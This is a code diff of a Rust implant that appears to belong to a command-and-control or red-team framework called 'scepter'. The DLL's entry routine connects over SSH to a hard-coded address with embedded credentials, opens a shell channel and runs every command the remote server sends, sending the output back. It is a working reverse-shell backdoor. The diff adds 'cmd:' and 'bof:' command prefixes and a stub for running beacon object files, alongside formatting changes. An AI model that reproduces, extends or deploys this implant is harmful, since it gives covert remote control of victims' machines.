@@ -1,15 +1,15 @@
 #![no_main]
 #![allow(dead_code)]
 
+use debug_print::debug_println;
+use russh::keys::*;
+use russh::*;
+use scepter_common::{PASSWORD, SSH_CONNECT_IPV4_ADDRESS, SSH_PORT, USERNAME};
 use std::io;
 use std::io::Write;
 use std::os::raw::c_void;
-use std::process::{exit, Command};
+use std::process::{Command, exit};
 use std::sync::Arc;
-use debug_print::debug_println;
-use russh::*;
-use russh::keys::*;
-use scepter_common::{PASSWORD, SSH_CONNECT_IPV4_ADDRESS, SSH_PORT, USERNAME};
 
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::Foundation::{BOOL, HANDLE};
@@ -30,7 +30,7 @@ pub struct Session {
 }
 
 impl Session {
-    async fn call(&mut self, command: &str) -> tokio::io::Result<u32>{
+    async fn call(&mut self, command: &str) -> tokio::io::Result<u32> {
         let mut channel = self.session.channel_open_session().await.unwrap();
         channel.exec(true, command).await.unwrap();
 
@@ -60,26 +60,46 @@ impl Session {
     }
 }
 
-pub fn execute_command(command: &str) -> Result<String, io::Error> {
+// TODO
+pub fn run_bof(bof: String) {
+    unimplemented!()
+}
+
+pub fn run_command(command: &str) -> Result<String, io::Error> {
+    let mut cmd = String::new();
+    let mut bof = String::new();
+
+    // Check for cmd prefix
+    if command.starts_with("cmd:") {
+        cmd = command.replace("cmd:", "");
+    }
+
+    // Check for bof prefix
+    if command.starts_with("bof: ") {
+        bof = command.replace("bof: ", "");
+        run_bof(bof);
+    }
+
     // Handle the exit command specially
-    if command.starts_with("exit") {
+    if cmd.starts_with("exit") {
         debug_println!("Exiting...");
         exit(0);
     }
 
     // For other commands, parse into program and arguments
-    let parts: Vec<&str> = command.split_whitespace().collect();
+    let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.is_empty() {
-        return Err(std::io::Error::new(io::ErrorKind::InvalidInput, "Empty command"));
+        return Err(std::io::Error::new(
+            io::ErrorKind::InvalidInput,
+            "Empty command",
+        ));
     }
 
     let program = parts[0];
     let args = &parts[1..];
 
-    // Create and execute the command, capturing output
-    let output = Command::new(program)
-        .args(args)
-        .output()?;
+    // Create and execute the cmd, capturing output
+    let output = Command::new(program).args(args).output()?;
 
     // Check if the command executed successfully
     if output.status.success() {
@@ -91,29 +111,44 @@ pub fn execute_command(command: &str) -> Result<String, io::Error> {
         let stderr = String::from_utf8_lossy(&output.stderr).to_string();
         Err(std::io::Error::new(
             io::ErrorKind::Other,
-            format!("Command failed: {}", stderr)
+            format!("Command failed: {}", stderr),
         ))
     }
 }
-
 
 pub async fn dll_main() {
     let config = russh::client::Config::default();
     let config = Arc::new(config);
     let sh = Client {};
 
-    let interface_ip = String::from_utf8_lossy(SSH_CONNECT_IPV4_ADDRESS).to_string().trim_matches(char::from(0)).to_string();
-    let ssh_port = String::from_utf8_lossy(SSH_PORT).to_string().trim_matches(char::from(0)).to_string();
+    let interface_ip = String::from_utf8_lossy(SSH_CONNECT_IPV4_ADDRESS)
+        .to_string()
+        .trim_matches(char::from(0))
+        .to_string();
+    let ssh_port = String::from_utf8_lossy(SSH_PORT)
+        .to_string()
+        .trim_matches(char::from(0))
+        .to_string();
     let addrs = format!("{}:{}", interface_ip, ssh_port);
 
     debug_println!("Connecting to {}", addrs);
 
     match client::connect(config, addrs, sh).await {
         Ok(mut session) => {
-            let username = String::from_utf8_lossy(USERNAME).to_string().trim_matches(char::from(0)).to_string();
-            let password = String::from_utf8_lossy(PASSWORD).to_string().trim_matches(char::from(0)).to_string();
+            let username = String::from_utf8_lossy(USERNAME)
+                .to_string()
+                .trim_matches(char::from(0))
+                .to_string();
+            let password = String::from_utf8_lossy(PASSWORD)
+                .to_string()
+                .trim_matches(char::from(0))
+                .to_string();
 
-            debug_println!("Authenticating with username {} and password {}", username, password);
+            debug_println!(
+                "Authenticating with username {} and password {}",
+                username,
+                password
+            );
 
             // Authenticate with password
             let auth_result = session.authenticate_password(username, password).await;
@@ -131,54 +166,87 @@ pub async fn dll_main() {
                                 // Request a shell - this is crucial for receiving ongoing data
                                 match channel.request_shell(true).await {
                                     Ok(_) => {
-                                        debug_println!("Shell session established, waiting for messages...");
+                                        debug_println!(
+                                            "Shell session established, waiting for messages..."
+                                        );
 
                                         // Wait for messages from the server
                                         loop {
                                             match channel.wait().await {
                                                 Some(ChannelMsg::Data { ref data }) => {
                                                     let input = String::from_utf8_lossy(data);
-                                                    debug_println!("Server message: {}", String::from_utf8_lossy(data));
-                                                    let _ = match execute_command(&*input){
+                                                    debug_println!(
+                                                        "Server message: {}",
+                                                        String::from_utf8_lossy(data)
+                                                    );
+                                                    let _ = match run_command(&*input) {
                                                         Ok(output) => {
                                                             debug_println!("{}", output);
                                                             // Use the data method provided by the russh library:
-                                                            session.data(channel.id(), CryptoVec::from(output.as_bytes())).await.unwrap();
-                                                        },
+                                                            session
+                                                                .data(
+                                                                    channel.id(),
+                                                                    CryptoVec::from(
+                                                                        output.as_bytes(),
+                                                                    ),
+                                                                )
+                                                                .await
+                                                                .unwrap();
+                                                        }
                                                         Err(e) => {
                                                             debug_println!("Error: {}", e);
                                                             // Use the data method provided by the russh library:
-                                                            session.data(channel.id(), CryptoVec::from(e.to_string().as_bytes())).await.unwrap();
+                                                            session
+                                                                .data(
+                                                                    channel.id(),
+                                                                    CryptoVec::from(
+                                                                        e.to_string().as_bytes(),
+                                                                    ),
+                                                                )
+                                                                .await
+                                                                .unwrap();
                                                         }
                                                     };
-
-                                                },
-                                                Some(ChannelMsg::ExtendedData { ref data, .. }) => {
-                                                    debug_println!("Server extended data: {}", String::from_utf8_lossy(data));
-                                                },
+                                                }
+                                                Some(ChannelMsg::ExtendedData {
+                                                    ref data, ..
+                                                }) => {
+                                                    debug_println!(
+                                                        "Server extended data: {}",
+                                                        String::from_utf8_lossy(data)
+                                                    );
+                                                }
                                                 Some(ChannelMsg::Eof) => {
-                                                    debug_println!("Server closed the connection (EOF)");
+                                                    debug_println!(
+                                                        "Server closed the connection (EOF)"
+                                                    );
                                                     break;
-                                                },
+                                                }
                                                 Some(ChannelMsg::ExitStatus { exit_status }) => {
-                                                    debug_println!("Server session exited with status: {}", exit_status);
+                                                    debug_println!(
+                                                        "Server session exited with status: {}",
+                                                        exit_status
+                                                    );
                                                     break;
-                                                },
+                                                }
                                                 Some(other) => {
-                                                    debug_println!("Other message from server: {:?}", other);
-                                                },
+                                                    debug_println!(
+                                                        "Other message from server: {:?}",
+                                                        other
+                                                    );
+                                                }
                                                 None => {
                                                     debug_println!("Channel closed unexpectedly");
                                                     break;
                                                 }
                                             }
                                         }
-                                    },
+                                    }
                                     Err(e) => {
                                         debug_println!("Failed to request shell: {}", e);
                                     }
                                 }
-                            },
+                            }
                             Err(e) => {
                                 debug_println!("Failed to open session channel: {}", e);
                             }
@@ -186,12 +254,12 @@ pub async fn dll_main() {
                     } else {
                         debug_println!("Authentication failed");
                     }
-                },
+                }
                 Err(e) => {
                     debug_println!("Authentication error: {}", e);
                 }
             }
-        },
+        }
         Err(e) => {
             debug_println!("Connection error: {}", e);
         }
@@ -199,7 +267,6 @@ pub async fn dll_main() {
 
     debug_println!("Connection closed");
 }
-
 
 #[cfg(target_os = "windows")]
 #[unsafe(no_mangle)]
